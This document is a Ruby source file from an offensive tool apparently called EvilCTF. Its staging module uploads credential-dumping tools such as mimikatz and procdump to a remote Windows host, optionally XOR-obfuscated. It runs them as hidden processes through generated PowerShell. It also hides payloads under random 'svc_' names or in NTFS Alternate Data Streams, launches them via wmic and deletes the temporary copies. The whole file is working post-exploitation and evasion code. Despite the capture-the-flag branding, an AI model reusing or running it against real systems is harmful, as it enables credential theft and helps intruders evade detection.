# frozen_string_literal: true

require 'securerandom'

module EvilCTF
  module Tools
    module Stager
      module_function

      def safe_autostage(tool_key, shell, options, _logger, registry:, download_tool_proc:)
        tool = registry[tool_key]
        return false unless tool

        needs_extraction = tool[:zip] && (tool[:zip_pick] || tool[:zip_pick_x64] || tool[:zip_pick_x86])
        remote_path = tool[:recommended_remote]

        if needs_extraction
          extracted_file = nil

          if tool[:zip_pick_x64] && get_system_architecture(shell) == 'x64'
            extracted_file = tool[:zip_pick_x64].split('/').last
          elsif tool[:zip_pick_x86] && get_system_architecture(shell) == 'x86'
            extracted_file = tool[:zip_pick_x86].split('/').last
          elsif tool[:zip_pick]
            extracted_file = tool[:zip_pick].split('/').last
          end

          if extracted_file && !File.extname(extracted_file).empty?
            located_path = locate_extracted_remote_path(shell, tool[:recommended_remote], extracted_file)
            if located_path
              puts "[+] #{tool[:name]} already staged at #{located_path}"
              return true
            end
          end
        end

        arch = get_system_architecture(shell)
        puts "[*] System architecture: #{arch}"
        adjusted_tool = tool.dup

        if tool_key == 'procdump'
          if arch == 'x64'
            adjusted_tool[:filename] = 'procdump64.exe'
            adjusted_tool[:recommended_remote] = 'C:\\Users\\Public\\procdump64.exe'
          else
            adjusted_tool[:filename] = 'procdump.exe'
            adjusted_tool[:recommended_remote] = 'C:\\Users\\Public\\procdump.exe'
          end
        elsif tool_key == 'mimikatz' && tool[:zip]
          adjusted_tool[:zip_pick] = arch == 'x64' ? tool[:zip_pick_x64] : tool[:zip_pick_x86]
        end

        local_path = find_tool_on_disk(tool_key, registry: registry)
        unless local_path && File.exist?(local_path)
          puts "[!] Local #{adjusted_tool[:filename]} not found. Attempting download..."
          local_path = download_tool_proc.call(tool_key)
          return false unless local_path && File.exist?(local_path)
        end

        if needs_extraction
          zip_remote_path = tool[:recommended_remote]

          if adjusted_tool[:zip_pick] && !tool[:zip_pick_x64] && !tool[:zip_pick_x86]
            zip_remote_path = File.extname(tool[:recommended_remote]).empty? ? "#{tool[:recommended_remote]}.zip" : tool[:recommended_remote]
          elsif tool[:zip_pick_x64] || tool[:zip_pick_x86]
            zip_remote_path = tool[:recommended_remote]
          end

          puts "[*] Staging ZIP file #{adjusted_tool[:filename]} to #{zip_remote_path}"

          success = upload_ok?(EvilCTF::Uploader.upload_file(local_path: local_path, remote_path: zip_remote_path,
                                                             shell: shell, xor_key: options[:xor_key]))
          return false unless success

          extract_root = tool[:recommended_remote].to_s.rpartition('\\').first
          extract_ps = <<~PS
            try {
              $zipPath = '#{EvilCTF::Utils.escape_ps_string(zip_remote_path)}'
              $extractPath = '#{EvilCTF::Utils.escape_ps_string(extract_root)}'

              Add-Type -AssemblyName System.IO.Compression.FileSystem
              [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)

              Remove-Item $zipPath -Force

              "EXTRACTED"
            } catch {
              "ERROR: $($_.Exception.Message)"
            }
          PS

          result = shell.run(extract_ps)
          if result.output.include?('EXTRACTED')
            puts '[+] ZIP extracted successfully on target'
            return true
          end

          extracted_file = adjusted_tool[:zip_pick]&.split('/')&.last
          located_path = if extracted_file && !File.extname(extracted_file).empty?
                           locate_extracted_remote_path(shell, tool[:recommended_remote], extracted_file)
                         end
          if located_path
            puts "[+] ZIP content already present at #{located_path}"
            return true
          end

          puts "[!] ZIP extraction failed: #{result.output}"
          return false
        end

        puts "[*] Staging #{adjusted_tool[:name]} to #{remote_path}"
        remote_path = randomized_remote_path(remote_path) if options[:random_names]
        remote_path = ads_stream_path(remote_path) if options[:stealth]
        deployed = upload_ok?(EvilCTF::Uploader.upload_file(local_path: local_path, remote_path: remote_path,
                                                            shell: shell, xor_key: options[:xor_key]))
        # Return the deployed path (truthy) so callers can execute a
        # randomized or ADS-stream filename; boolean callers rely on truthiness.
        deployed ? remote_path : false
      rescue StandardError => e
        puts "[!] Staging failed for #{tool_key}: #{e.message}"
        false
      end

      def execute_staged_tool(key, args = '', shell, registry:, remote_path: nil)
        tool = registry[key]
        return false unless tool

        # Callers may pass the actual deployed path (e.g. a randomized or
        # ADS-stream name used by stealth staging); default to the registry.
        remote_path ||= tool[:recommended_remote]
        begin
          puts "[*] Executing #{key} with args: #{args}"
          ps_cmd = if ads_path?(remote_path)
                     ads_execution_ps(remote_path, args)
                   else
                     <<~PS
                       try {
                         $proc = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -ArgumentList '#{EvilCTF::Utils.escape_ps_string(args)}' -PassThru -WindowStyle Hidden
                         $proc.WaitForExit(60000) | Out-Null
                         if ($proc.HasExited) {
                           "Completed with exit code: $($proc.ExitCode)"
                         } else {
                           "Timed out after 60 seconds"
                           $proc.Kill()
                         }
                       } catch {
                         "Error: $_.Exception.Message"
                       }
                     PS
                   end
          result = shell.run(ps_cmd)
          puts result.output
          true
        rescue StandardError => e
          puts "[!] Execution failed for #{key}: #{e.message}"
          false
        end
      end

      # Launch a binary stored in an Alternate Data Stream
      # (C:\path\file.exe:<stream>). Tries the direct wmic technique first so no
      # on-disk copy is needed, then falls back to materializing the stream into
      # a temp file, executing it, and removing it.
      def ads_execution_ps(remote_path, args)
        stream_path = EvilCTF::Utils.escape_ps_string(remote_path)
        args_list = EvilCTF::Utils.escape_ps_string(args)
        ext = File.extname(remote_path.to_s.rpartition(':').first)
        <<~PS
          try {
            $path = '#{stream_path}'
            $argsList = '#{args_list}'
            $r = & wmic process call create ""$path"" 2>$null
            if ($LASTEXITCODE -eq 0 -and $r -and ($r -match 'ProcessId')) {
              "ADS launch initiated via wmic"
            } else {
              $tmp = Join-Path $env:TEMP ("svc_" + [guid]::NewGuid().ToString('N') + '#{ext}')
              cmd /c "type `"$path`" > `"$tmp`""
              $proc = Start-Process -FilePath $tmp -ArgumentList $argsList -PassThru -WindowStyle Hidden
              $proc.WaitForExit(60000) | Out-Null
              if ($proc.HasExited) { "Completed with exit code: $($proc.ExitCode)" } else { "Timed out after 60 seconds"; $proc.Kill() }
              Remove-Item $tmp -Force -ErrorAction SilentlyContinue
            }
          } catch {
            "Error: $_.Exception.Message"
          }
        PS
      end

      def locate_extracted_remote_path(shell, recommended_remote, extracted_file)
        return nil if extracted_file.nil? || extracted_file.empty?

        search_root = recommended_remote.to_s.rpartition('\\').first
        search_root = EvilCTF::Utils.escape_ps_string(search_root)
        target_name = EvilCTF::Utils.escape_ps_string(extracted_file)
        locate_cmd = <<~PS
          $match = Get-ChildItem -Path '#{search_root}' -Filter '#{target_name}' -Recurse -ErrorAction SilentlyContinue |
            Select-Object -First 1 -ExpandProperty FullName
          if ($match) { "FOUND::$match" } else { 'MISSING' }
        PS

        result = shell.run(locate_cmd)
        found_line = result.output.to_s.lines.find { |line| line.start_with?('FOUND::') }
        found_line&.sub('FOUND::', '')&.strip
      rescue StandardError => e
        puts "[!] Remote extracted-path lookup failed: #{e.message}"
        nil
      end

      def find_tool_on_disk(tool_key, registry:)
        tool = registry[tool_key]
        return nil unless tool

        search_patterns = tool[:search_patterns] || [tool[:filename]]
        base_dirs = [
          Dir.home,
          File.join(Dir.home, 'Downloads'),
          File.join(Dir.home, 'Desktop'),
          File.join(Dir.home, 'tools'),
          File.join(Dir.home, 'bin'),
          Dir.pwd,
          File.join(Dir.pwd, 'tools')
        ].compact.uniq

        search_patterns.each do |pattern|
          base_dirs.each do |base|
            next unless Dir.exist?(base)

            Dir.glob(File.join(base, '**', pattern), File::FNM_CASEFOLD).each do |path|
              return path if File.file?(path)
            end
          end
        end
        nil
      end

      # upload_file may return true/false or a { ok: ... } result hash;
      # normalize so callers never mistake a failed upload for success.
      def upload_ok?(result)
        result.is_a?(Hash) ? result[:ok] : result
      end

      # Stealth helper: rename a remote destination to a random name in the
      # same directory while preserving the file extension. Handles Windows
      # backslash paths (File.dirname on POSIX only understands '/').
      def randomized_remote_path(remote_path)
        normalized = remote_path.to_s.gsub('\\', '/')
        dir = File.dirname(normalized).gsub('/', '\\')
        ext = File.extname(normalized)
        File.join(dir, "svc_#{SecureRandom.hex(4)}#{ext}").gsub('/', '\\')
      end

      # Stealth helper: attach the payload as an Alternate Data Stream on the
      # base path (C:\path\file.exe:<stream>). The uploader detects the colon
      # suffix and writes via Add-Content, so the binary never appears as a
      # standalone file on disk.
      def ads_stream_path(remote_path)
        "#{remote_path}:#{SecureRandom.hex(3)}"
      end

      # True when a path carries an Alternate Data Stream suffix (a non-empty
      # tail after the final colon that contains no path separators). 92.chr is
      # the backslash, kept out of the literal to avoid escaping pitfalls.
      def ads_path?(path)
        s = path.to_s
        return false unless s.include?(':')

        tail = s.rpartition(':').last
        !tail.empty? && !tail.include?('/') && !tail.include?(92.chr)
      end

      def get_system_architecture(shell)
        result = shell.run('$env:PROCESSOR_ARCHITECTURE')
        arch = result.output.strip

        if arch.include?('64')
          'x64'
        elsif arch.include?('86')
          'x86'
        else
          'unknown'
        end
      end
    end
  end
end
